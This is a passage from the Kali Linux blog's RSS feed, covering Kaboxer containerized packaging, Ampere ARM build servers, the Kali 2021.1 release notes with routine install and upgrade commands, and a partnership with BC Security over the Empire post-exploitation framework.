<code>*.deb</code> packages. This could be because, the tools:</p> <ul> <li>Are not developed with packaging and system integration in mind. They assume they can install specific versions of libraries, or patch libraries, or download pieces of software at runtime rather than at install time. This is against packaging standards and also is bad software engineering practice.</li> <li>May feel they are entitled to do whatever they please with the operating system or other applications. These actions should not be allowed and the software needs to be isolated. We have seen actions such as: <ul> <li>Creating users with specific UIDs/GIDs.</li> <li>Using paths that go against the Filesystem Hierarchy Standard (FHS).</li> <li>Using TCP or UDP ports that are usually affected to other services.</li> <li>Reconfiguring existing services.</li> </ul> </li> <li>Interact with external servers (maybe by a insecure method), thus the software itself cannot be fully trusted. As a result, it may be a good idea to isolate such software from valuable or sensitive data that may be present on the system.</li> </ul> <p>A way to provide the isolation required from above would be to use containerization. Containers allow running an application in an isolated environment, with drastically reduced risks of unplanned interaction with the rest of the system (users, services, other applications, existing files, specific versions of libraries, etc.).</p> <hr> <h2 id="design-choices">Design choices</h2> <p>While we are not excluding to support other containerization solutions, we have opted to start with Docker. It is well-known, widely used, and benefits from a large eco-system of images, thus ensuring its long term viability. Docker containers can be configured in many ways to achieve the various integrations that we need with the host system or even between multiple containers.</p> <p>The value of Kaboxer is in how it makes it easy to tie together docker containers with the host system, through the usual docker features such as mount points and port redirections, but also through integration with desktop menu entries. All those integrations, as well as the instructions to build or retrieve the docker image, are specified in a single YAML file.</p> <p>It is that single YAML file that is shipped in the <code>.deb</code> files that we provide in Kali and the post installation script of those packages will transparently download the image so that the application is ready to run afterwards.</p> <h3 id="build-of-docker-images">Build of Docker images</h3> <p>The build of the docker images is also mediated by Kaboxer but there&rsquo;s nothing magic, it boils down to calling <code>docker build</code> on a specific <code>Dockerfile</code> with a few variables.</p> <p>It is up to the packager to write that Dockerfile but that step can be trivial when the upstream project already has a Dockerfile or when it provides a ready-to-use docker image.</p> <h3 id="publication-of-docker-images">Publication of Docker images</h3> <p>This step is so boring that we have automated it with GitLab CI. Every time that we make a change to a repository dedicated to a &ldquo;kaboxed&rdquo; application, such as covenant, <a href="https://gitlab.com/kalilinux/packages/covenant-kbx/-/pipelines">GitLab CI</a> will rebuild the associated docker image and store it in its <a href="https://gitlab.com/kalilinux/packages/covenant-kbx/container_registry">image registry</a>.</p> <h3 id="integration-of-the-images-into-the-system">Integration of the images into the system</h3> <p>Once the app is containerized, we still need to make it available to the user in a seamless way, in a manner that ideally wouldn&rsquo;t even be noticeable. The user shouldn&rsquo;t even have to know that the app runs in a container.</p> <p>We already explained that users continue to interact with Kali packages to install and remove the containerized applications, even though those packages are mostly empty shells running Kaboxer commands in the various maintainer scripts. They do also provide <code>.desktop</code> files so that the applications can be started from the usual desktop menu, and command-line helpers so that they can be started from a terminal without having to know about Kaboxer.</p> <p>To be able to run docker containers, the users need some elevated permissions: we modified the Kali installer to grant those permissions by default to users created during the initial installation process. For other users, they will have to be added to the Kaboxer group (<code>adduser $USER kaboxer</code>).</p> <p>Users obviously want their application data to be retained so Kaboxer has facilities to configure volumes shared between the host and the container thus providing persistence even if containers are short-lived. And then depending on the kind of application, you likely need more specific integrations:</p> <ul> <li>For GUI applications, we need the host X11 socket to be accessible.</li> <li>For web applications, we want to expose the HTTP port and start the web browser on the appropriate URL.</li> </ul> <p>Those basic needs are covered with the current Kaboxer features but it seems likely that other kind of integrations will be required in the future.</p> <hr> <p>If you still want to learn more about Kaboxer, please see its <a href="https://gitlab.com/kalilinux/tools/kaboxer/">homepage (plus source code)</a>, and <a href="https://www.kali.org/docs/development/packaging-apps-with-kaboxer/">our documentation (with &ldquo;Hello World&rdquo; example)</a>.</p> <p>For examples of &ldquo;real world&rdquo; application, you can look at our first &ldquo;Kaboxed apps&rdquo;:</p> <ul> <li><a href="https://pkg.kali.org/pkg/covenant-kbx/">Covenant</a>, a framework to highlight the attack surface of .NET. Covenant comes as a server that is started in the background, plus a Web app that runs in the browser.</li> <li><a href="https://pkg.kali.org/pkg/firefox-developer-edition-kbx">Firefox Developer Edition</a>, is a web browser and we picked it as it is a complex large GUI application.</li> <li><a href="https://pkg.kali.org/pkg/zenmap-kbx">Zenmap</a>, the official NMAP GUI. Zenmap relies on deprecated <a href="https://www.kali.org/blog/python-2-end-of-life/">Python 2</a> libraries that are not available in Kali Linux.</li> </ul> <p>Want to get your hands dirty and give it a try?</p> <pre><code class="language-console">kali@kali:~$ sudo apt update &amp;&amp; sudo apt -y install covenant-kbx ... kali@kali:~$ kali@kali:~$ covenant-kbx Usage: covenant-kbx start|stop kali@kali:~$ kali@kali:~$ covenant-kbx start &gt;&gt;&gt; Initializing user data in ~/.local/covenant/data &gt;&gt;&gt; Starting covenant Please wait during the start, it can take a long time... &gt;&gt;&gt; Opening https://127.0.0.1:7443 with a web browser covenant/default started Press ENTER to exit kali@kali:~$ kali@kali:~$ ss -at | grep 7443 LISTEN 0 4096 0.0.0.0:7443 0.0.0.0:* kali@kali:~$ </code></pre> <p><em>Do not forget to open up <code>https://localhost:7443</code> in a web browser!</em></p> <p>If you would like to start exploring Kaboxer itself and see what is happening under the hood:</p> <pre><code class="language-console">kali@kali:~$ kaboxer usage: kaboxer [-h] [-v] {run,start,stop,get-meta-file,get-upstream-version,prepare,upgrade,list,ls,build,install,clean,push,save,load,purge} ... kaboxer: error: the following arguments are required: action kali@kali:~$ kali@kali:~$ kaboxer ls App Installed version Available version Packaging revision from YAML Packaging revision from image -------- ------------------- ------------------- ------------------------------ ------------------------------- covenant 0.6 - 1 1 kali@kali:~$ </code></pre> <p>Lastly, you can track what programs are using Kaboxer in Kali by searching packages ending with <code>-kbx</code>:</p> <pre><code class="language-console">kali@kali:~$ apt-cache search --names-only '\-kbx$' covenant-kbx - .NET command and control framework firefox-developer-edition-en-us-kbx - Mozilla Firefox web browser - Developer Edition - en-US zenmap-kbx - The Network Mapper Front End kali@kali:~$ </code></pre></description>
</item>
<item>
<title>Ampere Hardware & Kali Linux</title>
<link>https://www.kali.org/blog/ampere/</link>
<guid isPermaLink="true">https://www.kali.org/blog/ampere/</guid>
<pubDate>Wed, 05 May 2021 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/ampere/images/ampere.jpg" type="image/jpg"/>
<description><p>When <a href="https://amperecomputing.com/">Ampere</a> partnered with <a href="https://www.debian.org/News/2020/20200616">Debian</a>, this caught our eye. We were aware that our current ARM cloud provider was soon ending support for arm64 servers <em>(which we use for our build daemons)</em>.</p> <p>At <a href="https://www.kali.org/">Kali Linux</a>, one of the things which is important to us, is that we prefer not having to cross-compile our ARM binaries that we ship in our Kali packages. There are various reasons as to why, some of them are:</p> <ul> <li>With a huge list of packages, like the one we are maintaining <em>(<a href="https://www.kali.org/docs/policy/penetration-testing-tools-policy/">600+</a> at the time of writing)</em>, there will be a certain small percent that are not ready to be cross-compiled.</li> <li>We want to be able to run the upstream test suites as part of the build, and in many case the testing software assumes that you can natively run the binaries that you just built.</li> <li>We believe in &ldquo;dogfooding&rdquo; - we create an Operating System, that works on ARM. We want to use the OS, and the tools in it. We do this on <strong>ARM systems for our day-to-day work</strong>.</li> </ul> <p>We reached out to Ampere to see if they would be able to help us out. We soon realised they have the same mindset as we do, <strong>ARM is the way forward</strong>. When developing Kali Linux, we treat <strong>ARM devices as &ldquo;first class citizens&rdquo;</strong>, just like we do with our &ldquo;desktop&rdquo; images <em>(amd64/i386)</em>. There are many advantages to ARM, such as using <strong>less power</strong> <em>(which means they don&rsquo;t need cooling)</em>, <strong>lighter</strong> <em>(handy when traveling to be on site or mailing devices to be a drop box)</em> and <strong>cheaper devices</strong> <em>(client doesn&rsquo;t have to return the device!)</em>. These make <strong>really small form factor devices</strong> - which for doing penetration testing or red team exercises on site, expands the possibilities of where to hide various devices <em>(imagination is the only limitation)</em>. This is why we try and give the same user experience regardless of the platform you are using Kali on. <em>This is why we have pre-generated images and build scripts for as many different devices as possible</em></p> <p>Ampere has various community outreach programs, allowing as many different people as possible to interact with their hardware. The offerings are only expanding, and we now have a new permanent ARM home at <a href="https://osuosl.org/">Oregon State University&rsquo;s Open Source Lab</a> where we are building all of our ARM packages, with plans to move our ARM OS images to be built here too in the near future.</p> <p>It is never a fun task having to re-build systems, but we have noticed a very large advantage of doing so. <strong>There was a huge increase in performance from using Ampere&rsquo;s hardware</strong>. The change of environment was <strong>noticed straight away</strong>, without any changes to our configuration. Below is the first three packages we built and the time differences.</p> <table> <thead> <tr> <th>Package</th> <th>Old (HH:MM:SS)</th> <th>New (HH:MM:SS)</th> <th>Difference (HH:MM:SS)</th> <th>Percent Improvement</th> </tr> </thead> <tbody> <tr> <td><a href="https://pkg.kali.org/pkg/linux">Linux Kernel</a></td> <td>08:31:38</td> <td>03:09:40</td> <td>05:21:53</td> <td>269.75%</td> </tr> <tr> <td><a href="https://pkg.kali.org/pkg/metasploit-framework">Metasploit-Framework</a></td> <td>00:18:00</td> <td>00:14:30</td> <td>00:03:30</td> <td>124.14%</td> </tr> <tr> <td><a href="https://pkg.kali.org/pkg/debian-installer">debian-installer</a></td> <td>00:24:16</td> <td>00:14:53</td> <td>00:09:23</td> <td>163.05%</td> </tr> </tbody> </table> <p>The results speak for themselves. Every package is now <strong>building drastically quicker</strong>. We also believe, with tweaking a few configuration we can gain <strong>even more of a performance increase</strong>. This is only possible by the increased RAM offering with OSUOSL. This will allow for OverlayFS to be used with <code>tmpfs</code> (RAM file system) which will seamlessly reduce having to access any disk drives.</p> <p>We are very grateful for Ampere who are now powering our arm64/armhf/armel package build daemons. We will be moving over our ARM images building machine, as well as exploring the opportunity todo various other general services (e.g. web servers) to them given their performance. <strong>We are delighted with the partnership. Thank you Ampere!</strong> This sort of partnership is what the open-source community is all about. And we are pleased as can be to have a partner like Ampere to rely on with such an important part of our build process.</p></description>
</item>
<item>
<title>Kali Linux 2021.1 Release (Command-Not-Found)</title>
<link>https://www.kali.org/blog/kali-linux-2021-1-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2021-1-release/</guid>
<pubDate>Wed, 24 Feb 2021 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-2021-1-release/images/banner-2021.1-release.jpg" type="image/jpg"/>
<description><p>Today we&rsquo;re pushing out the first Kali Linux <a href="https://www.kali.org/releases/">release</a> of the year with <strong>Kali Linux 2021.1</strong>. This edition brings enhancements of existing features, and is ready to be <a href="https://www.kali.org/get-kali/">downloaded</a> or <a href="https://www.kali.org/docs/general-use/updating-kali/">upgraded <em>if you have an existing Kali Linux installation</em></a>.</p> <p>The summary of the <a href="https://bugs.kali.org/changelog_page.php">changelog</a> since the <a href="https://www.kali.org/blog/kali-linux-2020-4-release/">2020.4 release from November 2020</a> is:</p> <ul> <li><strong><a href="https://www.kali.org/blog/kali-linux-2021-1-release/#xfce--kde-updates">Xfce 4.16</a></strong> - Our preferred and current default desktop environment has been updated and tweaked</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2021-1-release/#xfce--kde-updates">KDE 5.20</a></strong> - Plasma also received a version bump</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2021-1-release/#terminals-tweaks">Terminals</a></strong> - <code>mate-terminal</code>, <code>terminator</code> and <code>tilix</code> all had various work carried out on them</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2021-1-release/#finding-commands-that-didnt-want-to-be-found">Command Not Found</a></strong> - A helping hand to say if a program needs to be installed</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2021-1-release/#partnerships-with-tools-authors">Partnership with more tool authors</a></strong> - BC Security &amp; Joohoi have been producing great tools and we want to support them</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2021-1-release/#new-tools-in-kali">New tools &amp; updates</a></strong> - Multiple new tools have been added to Kali and are ready for you</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2021-1-release/#kali-nethunter-updates">Kali NetHunter</a></strong> - New BusyBox &amp; Rucky version, and boot-animation</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2021-1-release/#kali-arm-updates">Kali ARM</a></strong> - Preliminary support for Parallels on Apple Silicon (Apple M1) &amp; Raspberry Pi 400 (WiFi Support)</li> </ul> <p>The Kali project itself also has a couple different changes:</p> <ul> <li><strong><a href="https://www.kali.org/blog/kali-linux-2021-1-release/#kalis-website">New Kali website</a></strong> - You may have noticed a few things looking different</li> <li><strong><a href="https://www.kali.org/newsletter/">Kali newsletter</a></strong> - Rather than you coming to us for updates, we can push them to your inbox</li> </ul> <hr> <h2 id="xfce--kde-updates">Xfce &amp; KDE Updates</h2> <p>How you choose to interact with Kali is completely up to you. You may want to access Kali locally or remotely, either graphically or on the command line. Even when you pick a method, there are still options you can choose from, such as a desktop environment.</p> <p>By default, Kali uses <a href="https://www.kali.org/blog/kali-linux-2019-4-release/">Xfce</a>, but during the setup process, allows for GNOME, KDE, or no GUI to be selected. After the setup is complete, <a href="https://www.kali.org/docs/general-use/switching-desktop-environments/">you can install even more</a>. We have pre-configurations for Enlightenment, i3, LXDE, and MATE as well.</p> <p>So when a desktop environment gets an update, they often enhance day-to-day activities for their users. It&rsquo;s best to hear it straight from the authors, for a tour of what&rsquo;s changed:</p> <ul> <li><a href="https://www.xfce.org/about/tour416">Xfce 4.16</a></li> <li><a href="https://kde.org/announcements/plasma/5/5.20.0/">KDE 5.20</a></li> </ul> <p>Below is our tweaked GTK3 theme, on Xfce:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2021-1-release/images/xfce-414-new.png'> <img src="https://www.kali.org/blog/kali-linux-2021-1-release/images/xfce-414-new.png" alt="" /> </a> </p> </p> <h2 id="terminals-tweaks">Terminals Tweaks</h2> <p>When we use Kali, we spend a significant amount of time using the command line. A lot of the time, we do it using a local terminal <em>(rather than in a console or remote SSH)</em>. With the options of desktop environments, there are also choices when it comes to the terminals <em>(same with what shell to use)</em>. We have been working away on various terminals (<code>xfce4-terminal</code>, <code>tmux</code>, <code>tilix</code>, <code>konsole</code>, <code>qterminal</code>, and <code>mate-terminal</code>) to &ldquo;Kali-fy&rdquo; them:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2021-1-release/images/kali-terminals.png'> <img src="https://www.kali.org/blog/kali-linux-2021-1-release/images/kali-terminals.png" alt="" /> </a> </p> </p> <h2 id="finding-commands-that-didnt-want-to-be-found">Finding Commands That Didn&rsquo;t Want To Be Found</h2> <p><a href="https://www.kali.org/blog/major-metapackage-makeover/">A while ago</a>, we changed the <strong>default set of tools installed</strong> in Kali. Most users know they can either install a one-off package, or revert back to the old set of defaults <em>(<code>apt install kali-linux-large</code>)</em>. But to help communicate our changes (as well as any new tools), we have now included <code>command-not-found</code> by default. <em>This is an &ldquo;optional&rdquo; package, which can be removed without removing all of <code>kali-linux-default</code>.</em></p> <p>Without <code>command-not-found</code> installed:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ gitleaks gitleaks: command not found </code></pre> <p>If you are wondering &ldquo;How does this help me?&rdquo;, or has the above ever happened to you, we like to think people&rsquo;s next stage would be to do <code>apt-cache search gitleaks</code> and see it in the network repositories. But we can do better. Now with <code>command-not-found</code>:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ gitleaks Command 'gitleaks' not found, but can be installed with: sudo apt install gitleaks +--(kali?kali)-[~] +-$ gitleakss Command 'gitleakss' not found, did you mean: command 'gitleaks' from deb gitleaks Try: sudo apt install &lt;deb name&gt; +--(kali?kali)-[~] +-$ badcmd badcmd: command not found </code></pre> <p>As you can see from the above example:</p> <ul> <li><code>gitleaks</code> - If the command you entered is the name of an executable available in Kali, it will say the package that you need to install <em>(if its not already!)</em></li> <li><code>gitleakss</code> - If you are &ldquo;fat fingered&rdquo; and make a typo, it may make a suggestion</li> <li><code>badcmd</code> - If you typed in an invalid command that doesn&rsquo;t exist in Kali, it will give the original message of &ldquo;command not found&rdquo;.</li> </ul> <p>So, how can I get this magic? Good question! If you&rsquo;re:</p> <ul> <li>Doing a fresh install of Kali Linux 2021.1 or later, it will &ldquo;just happen&rdquo; during the setup.</li> <li>Updating Kali and you are using a Bash shell, then it will &ldquo;just happen&rdquo; too.</li> <li>Updating Kali and you are using a Zsh shell, you will need to add the following lines to your <code>~/.zshrc</code>:</li> </ul> <pre><code class="language-sh"># enable command-not-found if installed if [ -f /etc/zsh_command_not_found ]; then . /etc/zsh_command_not_found fi </code></pre> <p>But it doesn&rsquo;t have to end here. By adding <code>COMMAND_NOT_FOUND_INSTALL_PROMPT=1</code> to your shell&rsquo;s environment <em>(e.g. <code>~/.bashrc</code> or <code>~/.zshrc</code>)</em>, <code>command-not-found</code> will take it one step further, and also prompt you if you want to install the missing package. <em>This change is something we will be putting in in a future release.</em></p> <p>Hope it helps!</p> <h2 id="partnerships-with-tools-authors">Partnerships with Tools Authors</h2> <p>Carrying on from our <a href="https://www.kali.org/blog/kali-linux-2020-4-release/">previous partnership</a> with byt3bl33d3r, we have expanded to supporting:</p> <ul> <li><a href="https://www.kali.org/blog/empire-starkiller/">BC Security</a> - Giving Kali exclusive early access to &ldquo;<a href="https://pkg.kali.org/pkg/powershell-empire">Empire</a>&rdquo; (<code>powershell-empire</code>) &amp; &ldquo;<a href="https://pkg.kali.org/pkg/starkiller">StarKiller</a>&rdquo;</li> <li><a href="https://twitter.com/joohoi">Joohoi</a> - The creator of &ldquo;Fuzz Faster U Fool (<a href="https://pkg.kali.org/pkg/ffuf">ffuf</a>)&rdquo;</li> </ul> <p>The announcement with Joohoi is new for Kali 2021.1. Like the previous sponsorships, you can either <a href="https://github.com/sponsors/joohoi">sponsor him directly</a> to get the latest access to ffuf, <a href="https://www.kali.org/">use Kali Linux</a>, or wait 30 days until the <a href="https://github.com/ffuf/ffuf">source code</a> becomes public. However, he has <a href="https://github.com/ffuf/ffuf#access-the-sponsorware-through-code-contributions">also announced</a> anyone who makes a significant contribution, which gets accepted into the project, also gets access!</p> <h2 id="new-tools-in-kali">New Tools in Kali</h2> <p>It wouldn&rsquo;t be a Kali release if there weren&rsquo;t any new tools added! A quick run down of what&rsquo;s been added <em>(to the network repositories)</em>:</p> <ul> <li><a href="https://pkg.kali.org/pkg/airgeddon">Airgeddon</a> - Audit wireless networks</li> <li><a href="https://pkg.kali.org/pkg/altdns">AltDNS</a> - Generates permutations, alterations and mutations of subdomains and then resolves them</li> <li><a href="https://pkg.kali.org/pkg/arjun">Arjun</a> - HTTP parameter discovery suite</li> <li><a href="https://pkg.kali.org/pkg/chisel">Chisel</a> - A fast TCP/UDP tunnel over HTTP</li> <li><a href="https://pkg.kali.org/pkg/dnsgen">DNSGen</a> - Generates combination of domain names from the provided input</li> <li><a href="https://pkg.kali.org/pkg/dumpsterdiver">DumpsterDiver</a> - Search secrets in various filetypes</li> <li><a href="https://pkg.kali.org/pkg/getallurls">GetAllUrls</a> - Fetch known URLs from AlienVault&rsquo;s Open Threat Exchange, the Wayback Machine, and Common Crawl</li> <li><a href="https://pkg.kali.org/pkg/gitleaks">GitLeaks</a> - Searches Git repo&rsquo;s history for secrets and keys</li> <li><a href="https://pkg.kali.org/pkg/httprobe">HTTProbe</a> - Take a list of domains and probe for working HTTP and HTTPS servers</li> <li><a href="https://pkg.kali.org/pkg/massdns">MassDNS</a> - A high-performance DNS stub resolver for bulk lookups and reconnaissance</li> <li><a href="https://pkg.kali.org/pkg/pskracker">PSKracker</a> - WPA/WPS toolkit for generating default keys/pins</li> <li><a href="https://pkg.kali.org/pkg/wordlistraider">WordlistRaider</a> - Preparing existing wordlists</li> </ul> <p>Happy hacking!</p> <h2 id="kalis-website">Kali&rsquo;s Website</h2> <p>Until recently, the only way you could be reading this would have been from our <a href="https://www.kali.org/rss.xml">RSS feed</a> or directly from our <a href="https://www.kali.org/blog/">blog</a> <em>(as we only recently made the <a href="https://www.kali.org/blog/kali-linux-newsletter-keeping-in-touch/">announcement</a> of the <a href="https://www.kali.org/newsletter/">Kali Newletter</a>)</em>. You may of noticed already, and <a href="https://www.kali.org/blog/2019-2020-review-onwards-with-2021/">we said</a> that it was coming, and it finally has - <a href="https://www.kali.org/">kali.org</a> has had a face-lift!</p> <p>We have <em>(finally)</em> moved away from WordPress to Hugo. Similarly to Kali, the website will also be a rolling distribution. The recent change is mostly cosmetic and content <em>(both were long overdue)</em>, and we have made plans for new features to be added.</p> <p>Another upside of the switch is that we can take more advantage of what GitLab has to offer. We recently had <a href="https://about.gitlab.com/blog/2021/02/18/kali-linux-movingtogitlab/">an interview with GitLab</a> about the switch.</p> <p>On the subject of interviews, we also had a word with <a href="https://www.kali.org/blog/mr-robot-arg-society/">Mr Robot&rsquo;s ARG Society</a> if you missed that.</p> <h2 id="wallpapers">Wallpapers</h2> <p>Just a quick little thing, we have tweaked our wallpaper packages:</p> <ul> <li><code>kali-wallpapers-2020.4</code> - Kali&rsquo;s wallpapers from 2020.4 and onwards <em>(for the time being)</em></li> <li><code>kali-wallpapers-2019.4</code> - Kali&rsquo;s wallpapers between 2019.4 and 2020.3.</li> <li><code>kali-wallpapers-legacy</code> - BackTrack &amp; Kali nostalgic backgrounds</li> <li><code>kali-wallpapers-all</code> - Every wallpaper</li> <li><code>kali-community-wallpapers</code> - created and submitted by the community <em>(<a href="https://gitlab.com/kalilinux/packages/kali-community-wallpapers/-/merge_requests">submit yours</a> today!)</em></li> </ul> <p>With the alterations to the packages, we have taken the time to improve support for Xfce when using them.</p> <p>Enjoy!</p> <h2 id="kali-nethunter-updates">Kali NetHunter Updates</h2> <p>BusyBox, one of the core engines of Kali NetHunter, has received a well deserved upgrade to version &ldquo;1.32.0-nethunter&rdquo;. BusyBox is used internally to ensure that NetHunter tools and commands are executed consistently across the vast number of different Android versions and vendor modifications. This change, whilst big, should go unnoticed by users and will help developers to port their code to NetHunter with no hassles at all. <a href="https://twitter.com/yesimxev">@yesimxev</a> has added a handy section to the settings menu, which allows developers to select different BusyBox versions for testing:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2021-1-release/images/BusyBoxSelector.jpg'> <img src="https://www.kali.org/blog/kali-linux-2021-1-release/images/BusyBoxSelector.jpg" alt="" /> </a> </p> </p> <p>Speaking of developers: If you have any cool ideas you&rsquo;d like to see included in Kali NetHunter or if you would like to contribute to this amazing project, please reach out to us in our <a href="https://forums.kali.org/">forums</a> or on <a href="https://gitlab.com/kalilinux/nethunter">GitLab</a>. We would love to hear from you!</p> <p>Tools have been updated to the latest versions, notably Rucky - the &ldquo;modern looking USB Rubber Ducky Editor and Attack Launcher&rdquo;, which has been completely re-written by its author <a href="https://twitter.com/mayank_metha">@mayankmetha</a> and <a href="https://staging.nethunter.com/en/packages/com.mayank.rucky/">released in the Kali NetHunter App Store as version 2.1</a>.</p> <p>We&rsquo;ve also been busy working on the visual aspects of Kali NetHunter, with <a href="https://twitter.com/thiviyann">@s133py</a> adding a stunning new boot-animation to the growing selection:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2021-1-release/images/res_raw_boot_glitch.gif'> <img src="https://www.kali.org/blog/kali-linux-2021-1-release/images/res_raw_boot_glitch.gif" alt="" /> </a> </p> </p> <p>If you have a cool boot-animation you&rsquo;d like to share, please submit a merge request to our <a href="https://gitlab.com/kalilinux/nethunter/apps/kali-nethunter-bootanimation">Kali NetHunter boot-animation repository</a>.</p> <h2 id="kali-arm-updates">Kali ARM Updates</h2> <p>As you may have heard, Apple have released new Macs with their own processors, known as Apple Silicon <em>(Apple M1)</em>. So far, only Parallels have released something publicly that people can use for virtualization. To that end, we have generated both an installer &amp; live ISOs (<code>kali-linux-2021.1-installer-arm64.iso</code> and <code>kali-linux-2021.1-live-arm64.iso</code>) that can be used with VMs on Apple Silicon Macs. Many thanks to the people who reached out and offered to test and helped us to iron out the bugs. If you&rsquo;d like to see it in action, <a href="https://twitter.com/davidbombal">David Bombal</a> has put out a <a href="https://www.youtube.com/watch?v=uBzKDF67eWY">video</a> of it.</p> <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"> <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="allowfullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.kali.org/blog/kali-linux-2021-1-release/https://www.youtube-nocookie.com/embed/uBzKDF67eWY?autoplay=0&controls=1&end=0&loop=0&mute=0&start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video" ></iframe> </div> <p>We have also added support for the Raspberry Pi 400&rsquo;s wireless card, however it is very important to note that this is <em>not</em> a <a href="https://github.com/seemoo-lab/nexmon">nexmon</a> firmware, as nexmon does not currently support it.</p> <p>The <a href="https://gitlab.com/kalilinux/build-scripts/kali-arm/">Kali ARM build scripts</a> have seen a few more improvements from <a href="https://twitter.com/frangalinux">Francisco Jose Rodriguez Martos</a> and we appreciate the assistance greatly. If you&rsquo;d like to get involved with ARM, check out the <a href="https://gitlab.com/kalilinux/build-scripts/kali-arm/-/issues">GitLab issue list</a>.</p> <hr> <h2 id="download-kali-linux-20211">Download Kali Linux 2021.1</h2> <p><strong>Fresh Images</strong>: So what are you waiting for? Start <a href="https://www.kali.org/get-kali/">downloading</a> already!</p> <p>Seasoned Kali Linux users are already aware of this, but for the ones who are not, we do also produce <strong><a href="https://cdimage.kali.org/kali-images/kali-weekly/">weekly builds</a></strong> that you can use as well. If you cannot wait for our next release and you want the latest packages <em>(or bug fixes)</em> when you download the image, you can just use the weekly image instead. This way you&rsquo;ll have fewer updates to do. <em>Just know that these are automated builds that we do not QA like we do our standard <a href="https://www.kali.org/releases/">release images</a></em>. But we gladly take <a href="https://bugs.kali.org/">bug reports</a> about those images because we want any issues to be fixed before our next release!</p> <p><strong>Existing Installs</strong>: If you already have an existing Kali Linux installation, remember you can always do a quick <a href="https://www.kali.org/docs/general-use/updating-kali/">update</a>:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ echo &quot;deb http://http.kali.org/kali kali-rolling main contrib non-free&quot; | sudo tee /etc/apt/sources.list +--(kali?kali)-[~] +-$ sudo apt update &amp;&amp; sudo apt -y full-upgrade +--(kali?kali)-[~] +-$ [ -f /var/run/reboot-required ] &amp;&amp; sudo reboot -f </code></pre> <p>You should now be on Kali Linux 2021.1. We can do a quick check by doing:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ grep VERSION /etc/os-release VERSION=&quot;2021.1&quot; VERSION_ID=&quot;2021.1&quot; VERSION_CODENAME=&quot;kali-rolling&quot; +--(kali?kali)-[~] +-$ uname -v #1 SMP Debian 5.10.13-1kali1 (2021-02-08) +--(kali?kali)-[~] +-$ uname -r 5.10.0-kali3-amd64 </code></pre> <p><em>NOTE: The output of <code>uname -r</code> may be different depending on the system <a href="https://pkg.kali.org/pkg/linux">architecture</a>.</em></p> <p>As always, should you come across any bugs in Kali, please submit a report on our <a href="https://bugs.kali.org/">bug tracker</a>. <em>We&rsquo;ll never be able to fix what we do not know is broken!</em> <strong>And <a href="https://twitter.com/kalilinux">Twitter</a> is not a Bug Tracker!</strong></p></description>
</item>
<item>
<title>BC Security's Empire/Starkiller & Kali Linux</title>
<link>https://www.kali.org/blog/empire-starkiller/</link>
<guid isPermaLink="true">https://www.kali.org/blog/empire-starkiller/</guid>
<pubDate>Tue, 12 Jan 2021 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/empire-starkiller/images/kali-bc-security-partnership.jpg" type="image/jpg"/>
<description><p>We have always worked to support the information security community as a whole, and over the years experimented with different ideas <em>(some with a greater success than others)</em>. One of the key components to Kali is the tools included <em>(either pre-installed or installed via apt)</em>. Joining together infosec professional/hobbyist and tool authors, today we are announcing another partnership: <strong><a href="https://www.bc-security.org/post/kali-and-bc-security-partnership">Kali has partnered with BC Security</a></strong>.</p> <p>BC Security is the team who is currently maintaining the most active fork of <a href="https://pkg.kali.org/pkg/powershell-empire">Empire</a>. In August 2019, the <a href="https://twitter.com/xorrior/status/1156626181107736576">original maintainers</a> archived the project, but with Open-source projects <em>(as long as they don&rsquo;t break software licenses</em>) other groups can take someone else&rsquo;s code and improve upon it. This is exactly what BC Security did, forking the project, to keep the flame of <a href="https://github.com/BC-SECURITY/Empire">PowerShell Empire</a> alive.</p> <p>Empire is a post-exploitation framework, which its agents supporting various different Operating Systems (OS). Windows is purely implemented in PowerShell <em>(without <code>powershell.exe</code>!)</em>, and Linux/macOS is done in Python 3. Feature rich with various options to bypass various protections <em>(and allows for easy modification for custom evasion)</em>, Empire is often a favourite for Command and Control (C2) activity.</p> <p>We first had interaction with BC Security, when they were porting over the original Empire code base (v2.5) from Python 2 to 3 <em>(as v2 had reached <a href="https://www.kali.org/blog/python-2-end-of-life/">End of Life</a> in January 2020)</em>. This is to help ensure Empire is is up-to-date and relevant with the modern software stack. They have also put in the time to increase empires features <em>(growing on the original authors, that malware can be in PowerShell format)</em>. BC Security also have created their own &ldquo;Graphical User Interface (GUI)&rdquo;, <a href="https://github.com/BC-SECURITY/Starkiller">Starkiller</a>, to go along side Empire.</p> <p>Under their sponsorware model, in order to get the latest version of Empire &amp; Starkiller, you can <a href="https://github.com/sponsors/BC-SECURITY">sponsor</a> to get the latest access, <a href="https://www.kali.org/">use Kali Linux</a>, or wait 30 days until the <a href="https://github.com/BC-SECURITY">source code becomes public</a>. We believe the partnership will aid development of the tool <em>(who doesn&rsquo;t want new features!)</em>, but at the same time allowing access to it for as many people as possible.</p> <p>With the announcement of the partnership, there are new versions being released:</p> <ul> <li>Empire has reached v3.7</li> <li>Starkiller is now at v1.6</li> </ul> <p>For more information about the changelog and their views, you can read about on <a href="https://www.bc-security.org/post/kali-and-bc-security-partnership">their blog</a>. 